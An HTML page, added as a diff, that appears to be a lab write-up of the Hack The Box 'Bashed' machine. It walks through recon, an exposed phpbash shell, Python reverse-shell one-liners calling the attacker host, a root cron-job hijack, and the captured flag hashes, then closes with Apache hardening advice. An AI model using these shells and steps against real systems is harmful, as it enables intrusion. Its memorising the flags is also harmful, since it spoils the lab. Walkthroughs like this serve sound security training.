@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+    <link rel="stylesheet" href="style.css">
+    <head>
+
+    </head>
+    <body class="body">
+        <header>
+            <p style="display: inline; text-align: right; color:white;">UNDER CONSTRUCTION</p>
+            <div class="wrapper">
+                <ul class="navbar">
+                    <li class="navbarLink"><a href="lame.html">LAME</a></li>
+                    <li class="navbarLink"><a href="shocker.html">SHOCKER</a></li>
+                    <li class="navbarLink"><a href="bashed.html">BASHED</a></li>
+                </ul>
+            </div>
+        </header>
+        <main>
+            <div class="wrapper text">
+                <table class="wrapper text">
+                    <thead>
+                        <tr>
+                        <th>Name</th>
+                        <th style="text-align: right">IMAGE</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td class="tableLeft">Release Date</td>
+                            <td class="tableRight">RELEASE_DATE</td>
+                        </tr>
+                        <tr>
+                            <td class="tableLeft">Retire Date</td>
+                            <td class="tableRight">RETIRE_DATE</td>
+                        </tr>
+                        <tr>
+                            <td class="tableLeft">OS</td>
+                            <td class="tableRight">Linux</td>
+                        </tr>
+                        <tr>
+                            <td class="tableLeft">Base Points</td>
+                            <td class="tableRight">Easy [20]</td>
+                        </tr>
+                        <tr>
+                            <td class="tableLeft">Rated Difficulty</td>
+                            <td class="tableRight">GET_RATED</td>
+                        </tr>
+                        <tr>
+                            <td class="tableLeft">Radar Graph</td>
+                            <td class="tableRight">GET_RADAR</td>
+                        </tr>
+                    <tbody>
+                </table>
+            </div>
+            <div class="wrapper text">
+                <h1>INTRODUCTION</h1>
+                <h2>Weak webserver configuration.</h2>
+                <p>This this box we have access to a PHP developer's blog hosted on a server they use for development. The vulnerability on this box is a weakly configured Apache webserver.</p>
+                <p>The Apache webserver configuration file has an optional directive which allows directories to be browsed if there is no index.html file present in the directory.</p>
+                <p>From: <a href="https://httpd.apache.org/docs/current/mod/core.html#options">https://httpd.apache.org/docs/current/mod/core.html#options</a></p>
+                <img src="assets/bashed_1.png">
+                <p>This directive is enabled by default. As part of hardening the webserver this directive should be removed from the webserver configuration. Allowing directories to be browsed can lead to the accidental disclosure of sensitive data.</p>
+            </div>
+            <div class="wrapper text">
+                <h1>RECON</h1>
+                <p><code>The victim machine has the IP: <span class="ip">10.129.19.234</span><br>The attack machine has the IP: <span class="ip">10.10.14.35</span></code></p>
+                <p>To disover ports for enumeration we scan all TCP and UDP ports using nmap. Once these scans are complete, we will run nmap again on the discovered TCP ports using version detection scripts.</p>
+            </div>
+            <div class="wrapper console output">
+<pre><span class="prompt">┌──(downeg㉿tholia)-[~/htb/boxes/lame]
+└─$</span> <span class="command"> sudo nmap -sS -p- --min-rate 10000 -oN scans/nmap_tcp <span class="ip">10.129.19.234</span></span>
+Starting Nmap
+Nmap scan report for <span class="ip">10.129.19.234</span>
+Host is up (0.049s latency).
+Not shown: 65506 closed tcp ports (reset), 28 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 10.26 seconds
+                                                                                                                                                            
+<span class="prompt">┌──(downeg㉿tholia)-[~/htb/boxes/lame]
+└─$</span> <span class="command"> sudo nmap -sU -p- --min-rate 10000 -oN scans/nmap_udp <span class="ip">10.129.19.234 </span></span>
+Starting Nmap
+Nmap scan report for <span class="ip">10.129.19.234</span>
+Host is up (0.050s latency).
+All 65535 scanned ports on <span class="ip">10.129.19.234</span> are in ignored states.
+Not shown: 65458 open|filtered udp ports (no-response), 77 closed udp ports (port-unreach)
+
+Nmap done: 1 IP address (1 host up) scanned in 73.00 seconds
+                                                                                                                                                            
+<span class="prompt">┌──(downeg㉿tholia)-[~/htb/boxes/lame]
+└─$</span> <span class="command"> sudo nmap -p 80 -sV -sC -oN scans/nmap_tcp_scripts <span class="ip">10.129.19.234</span></span>
+Starting Nmap
+Nmap scan report for <span class="ip">10.129.19.234</span>
+Host is up (0.28s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Arrexel's Development Site
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 8.69 seconds
+                                                                                                                                                            
+<span class="prompt">┌──(downeg㉿tholia)-[~/htb/boxes/lame]
+└─$</span></pre>                
+            </div>
+            <div class="wrapper text">
+                <h1>OS VERSION DETECTION</h1>
+                <p>Searching launchpad.net we can determine that the underlying OS is Ubuntu Xenial released in April 2016, designated 16.04.</p>
+            </div>
+            <div class="wrapper">
+                <p><code class="code">site:launchpad.net Apache httpd 2.4.18</code></p>
+            </div>
+            <div class="wrapper text">
+                <p><a href="https://launchpad.net/ubuntu/+source/apache2/2.4.18-2ubuntu3.4">https://launchpad.net/ubuntu/+source/apache2/2.4.18-2ubuntu3.4</a></p>
+                <p><a href="https://launchpad.net/ubuntu/xenial">https://launchpad.net/ubuntu/xenial</a></p>
+            </div>
+            <div class="wrapper text">
+                <h1>SERVICE ENUMBERATION</h1>
+                <h2>HTTP - TCP 80</h2>
+                <p>There is only one port available as an attack vector, the HTTP port 80. Pointing a browser to this IP we find a PHP developer's blog.</p>
+                <p>Following the links on the home page gives us a link to the source code for a PHPBASH script hosted on github: <a href="https://github.com/Arrexel/phpbash">https://github.com/Arrexel/phpbash</a>. The post also hints that the phpbash script was developed on the webserver.</p>
+                <p>A directory brute force using gobuster identifies a number of directories which we can check.</p>
+            </div>
+            <div class="wrapper console output">
+<pre><span class="prompt">┌──(downeg㉿tholia)-[~/htb/boxes/lame]
+└─$</span> <span class="command"> gobuster dir -w ~/seclist_dir -f --url <span class="ip">http://10.129.19.234</span> | tee scans/gobuster</span>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     <span class="ip">http://10.129.19.234</span>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/downeg/seclist_dir
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Add Slash:               true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images/              (Status: 200) [Size: 1566]
+/js/                  (Status: 200) [Size: 3167]
+/css/                 (Status: 200) [Size: 1760]
+/uploads/             (Status: 200) [Size: 14]
+/dev/                 (Status: 200) [Size: 1150]
+/php/                 (Status: 200) [Size: 941]
+/fonts/               (Status: 200) [Size: 2097]
+/icons/               (Status: 403) [Size: 294]
+/server-status/       (Status: 403) [Size: 302]
+Progress: 62284 / 62285 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                                                                                                                                            
+<span class="prompt">┌──(downeg㉿tholia)-[~/htb/boxes/lame]
+└─$</span></pre> 
+            </div>
+            <div class="wrapper text">
+                <p>Browsing these discovererd directories we see that directory listing is enabled on the webserver.</p>
+                <img src="assets/bashed_2.png">
+                <p>In one of these directories we find the phpbash.php script.</p>
+                <img src="assets/bashed_3.png">
+                <p>The phpbash.php script can be executed and allows us to run commands as the www-data user. With a quick check of the system we see that there is a scriptmanager account and any commands
+                    can be run with the priviledges of scriptmanager. We will use this script script to send a reverse shell back to our attack machine using: </p>
+            </div>
+            <div class="wrapper">
+                <p><span class="code">python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<span class="ip">10.10.14.35</span>",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'</code></p>
+            </div>
+            <div class="wrapper text">
+                <p>Now that we have an upgraded TTY we can use wget to download the linPEAS priviledge escalation suggester for Linux. We download this script on the victim machine to the <code class=code>/dev/shm</code> directory.</p>
+                <p>A copy of linPEAS can be downloaded from here: <a href="">LINPEAS_LINK</a></p>
+                <p>We will elevate our priviledges from the www-data user to the scriptmanager user before we run linPEAS. This is done by starting an instance of <code class="code">/bin/bash</code> as the scriptmanager user.</p>
+            </div>
+            <div class="wrapper console output">
+<pre><span class="prompt">┌──(downeg㉿tholia)-[~/htb/boxes/lame]
+└─$</span> <span class="command"> /bin/bash</span>
+<span class="prompt">┌──(downeg㉿tholia)-[~/htb/boxes/lame]
+└─$</span> <span class="command"> nc -lnvp 4242</span>
+listening on [any] 4242 ...
+connect to [<span class="ip">10.10.14.35</span>] from (UNKNOWN) [<span class="ip">10.129.19.234</span>] 46884
+<span class="prompt">$</span><span class="command"> whoami</span>
+whoami
+www-data
+<span class="prompt">$</span><span class="command"> python -c 'import pty;pty.spawn("/bin/bash")';</span>
+python -c 'import pty;pty.spawn("/bin/bash")';
+www-data@bashed:/var/www/html/dev$ ^Z
+[1]+  Stopped                 nc -lnvp 4242
+
+<span class="prompt">┌──(downeg㉿tholia)-[~/htb/boxes/lame]
+└─$</span> <span class="command"> stty raw -echo;fg</span>
+nc -lnvp 4242
+
+<span class="prompt">www-data@bashed:/var/www/html/dev$</span> <span class="command">cd /dev/shm</span>
+<span class="prompt">www-data@bashed:/dev/shm$</span> <span class="command">wget http://<span class="ip">10.10.14.35</span>:8000/linpeas.sh</span>
+--2024-01-10 23:33:33--  http://<span class="ip">10.10.14.35</span>:8000/linpeas.sh
+Connecting to <span class="ip">10.10.14.35</span>:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 847920 (828K) [text/x-sh]
+Saving to: 'linpeas.sh'
+
+linpeas.sh          100%[===================>] 828.05K   916KB/s    in 0.9s    
+
+2024-01-10 23:33:34 (916 KB/s) - 'linpeas.sh' saved [847920/847920]
+
+<span class="prompt">www-data@bashed:/dev/shm$</span> <span class="command">sudo -u scriptmanager /bin/bash</span>
+
+<span class="prompt">scriptmanager@bashed:/dev/shm$</span> <span class="command">find / -name user.txt 2>/dev/null</span>
+/home/arrexel/user.txt
+<span class="prompt">scriptmanager@bashed:/dev/shm$</span> <span class="command">cat /home/arrexel/user.txt</span>
+1f82da11fba96f07aa9f26e7cbca60f2
+<span class="prompt">scriptmanager@bashed:/dev/shm$</span> <span class="command">sh ./linpeas.sh</span></pre>
+            </div>
+            <div class="wrapper text">
+                <p>An interesting find from the LinPEAS output is that there is a file <code class="code">/scripts/test.txt</code> which was modified in the last 5 minutes. This is not a typical file to be regularly updated on a Linux system and deserves further investigation.</p>
+            </div>
+            <div class="wrapper console output">
+<pre>╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+/scripts/test.txt
+/home/scriptmanager/.gnupg/trustdb.gpg
+/home/scriptmanager/.gnupg/pubring.gpg
+/home/scriptmanager/.gnupg/gpg.conf
+/var/log/auth.log
+/var/log/syslog
+
+logrotate 3.8.7</pre>
+            </div>
+            <div class="wrapper text">
+                <p>In a new Terminal tab we start a new reverse shell (to port 6666) so that we can dig deeper into this <code class="code">/scripts/</code> directory. After elevating our priviledges to <code class="code">scriptmanager</code> again we discover
+                that the write date of <code class="code">test.txt</code> was within the last minute. There is also a small python script in the directory which opens the <code class="code">test.txt</code> file and writes some output to it. The most interesting part though is that
+                the owner of the python script is our <code class="code">scriptmanager</code> user, but the owner and group of the txt file is <code class="code">root</code>. There must be some type of scheduled task set up by 
+                <code class="code">root</code> that is running this python script every minute.</p>
+                <p>As we are the owner of the python script we can write our own reverse shell script to this file. The script will open a reverse shell to our attack box on port 1234. Once the suspected scheduled task runs this as <code class="code">root</code> we should have 
+                    a access to the system as <code class="code">root</code> via our new reverse shell.</p>
+            </div>
+            <div class="wrapper console output">
+<pre><span class="prompt">┌──(downeg㉿tholia)-[~/htb/boxes/lame]
+└─$</span> <span class="command"> nc -lnvp 6666</span>
+listening on [any] 6666 ...
+connect to [<span class="ip">10.10.14.35</span>] from (UNKNOWN) [<span class="ip">10.129.19.234</span>] 54164
+<span class="prompt">$</span> <span class="command">python -c 'import pty;pty.spawn("/bin/bash")';</span>
+<span class="prompt">www-data@bashed:/dev/shm$</span> <span class="command">whoami</span>
+www-data
+<span class="prompt">www-data@bashed:/dev/shm$</span> <span class="command">sudo -u scriptmanager /bin/bash</span>
+<span class="prompt">scriptmanager@bashed:/dev/shm$</span> <span class="command">cat /scripts/test.txt</span>
+testing 123!
+<span class="prompt">scriptmanager@bashed:/dev/shm$</span> <span class="command">cd /scripts/</span>
+<span class="prompt">scriptmanager@bashed:/dev/shm$</span> <span class="command">ls</span>
+test.py  test.txt
+<span class="prompt">scriptmanager@bashed:/dev/shm$</span> <span class="command">ls -l</span>
+total 8
+-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4  2017 test.py
+-rw-r--r-- 1 root          root          12 Jan 10 23:47 test.txt
+<span class="prompt">scriptmanager@bashed:/dev/shm$</span> <span class="command">cat test.py</span> 
+f = open("test.txt", "w")
+f.write("testing 123!")
+f.close
+<span class="prompt">scriptmanager@bashed:/dev/shm$</span> <span class="command">date</span>
+Wed Jan 10 23:48:13 PST 2024
+<span class="prompt">scriptmanager@bashed:/dev/shm$</span> <span class="command"> echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.35",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' > test.py</span>
+<span class="prompt">scriptmanager@bashed:/dev/shm$</span> <span class="command">cat test.py</span>
+import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.35",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+<span class="prompt">scriptmanager@bashed:/dev/shm$</span> <span class="command">ls -l</span>
+total 8
+-rw-r--r-- 1 scriptmanager scriptmanager 191 Jan 10 23:49 test.py
+-rw-r--r-- 1 root          root           12 Jan 10 23:49 test.txt
+<span class="prompt">scriptmanager@bashed:/dev/shm$</span></pre>
+            </div>
+            <div class="wrapper text">
+                <p>Sure enough within a minute a new reverse shell is opened on our already listening netcat instance and we have root access to the victim machine.</p>
+            </div>
+            <div class="wrapper console output">
+<pre><span class="prompt">┌──(downeg㉿tholia)-[~/htb/boxes/lame]
+└─$</span> <span class="command"> nc -lnvp 1234</span>
+listening on [any] 1234 ...
+connect to [<span class="ip">10.10.14.35</span>] from (UNKNOWN) [<span class="ip">10.129.19.234</span>] 38938
+<span class="prompt">#</span><span class="command"> whoami</span>
+root
+<span class="prompt">#</span><span class="command"> cat `find / -name root.txt`</span>
+fec13b24b4b603458e920da9a54896c6
+<span class="prompt">#</span> </pre>
+            </div>
+            <div class="wrapper text">
+                <h1>CONCLUSION</h1>
+                <p>Now that we have root access we can confirm our suspicions. We see that there is a cron job configured to run every python script in the <code class="code">/scripts/</code> directory every minute. 
+                    These scripts will execute as the root user. All python scripts in this directory get executed so as an attacker we did not even need to overwrite the <code class="code">/scripts/test.py</code> script, we
+                    could have created our own python script in the driectory as the <code class="code">scriptmanager</code> user and it would have executed as <code class="code">root</code>.</p>
+            </div>
+            <div class="wrapper console output">
+<pre><span class="prompt">root@bashed:/#</span> <span class="command">ls -l /var/spool/cron/crontabs</span>
+total 4
+-rw------- 1 root crontab 260 Dec  4  2017 root
+<span class="prompt">root@bashed:/#</span> <span class="command">cat /var/spool/cron/crontabs/root</span>
+# DO NOT EDIT THIS FILE - edit the master and reinstall.
+# (/tmp/crontab.igz05b/crontab installed on Mon Dec  4 17:53:17 2017)
+# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
+* * * * * cd /scripts; for f in *.py; do python "$f"; done
+<span class="prompt">root@bashed:/#</span> </pre>
+            </div>
+            <div class="wrapper text">
+            <p>If we check the Apache configuration we can see that the <code class="code">Indexes</code> directive is set for the <code class="code">/var/www/</code> directory. This is the mis-configuration that allowed
+            us to view and execute the <code class="code">http://<span class="ip">10.129.19.234</span>/dev/phpbash.php</code> script.</p>
+        </div>
+        <div class="wrapper console output">
+<pre>&lt;Directory /var/www/&gt;
+    Options Indexes FollowSymLinks
+    AllowOverride None
+    Require all granted
+&lt;/Directory&gt;</pre>
+        </div>
+        <div class="wrapper text">
+            <p>If we remove this directive and restart the webserver process we see that we can no longer view the contents of the directories. This would not prevent us from accessing the files in the directories, but we would need to know
+                the names of the files, or have a very good list for brute forcing to find the php scripts. This would make it harder for an attacker to gain a foothold on the system using the php scripts.</p>
+        </div>
+        <div class="wrapper console output">
+<pre>&lt;Directory /var/www/&gt;
+    Options FollowSymLinks
+    AllowOverride None
+    Require all granted
+&lt;/Directory&gt;</pre>
+        </div>
+        <div class="wrapper text">
+            <img src="assets/bashed_5.png">
+        </div>
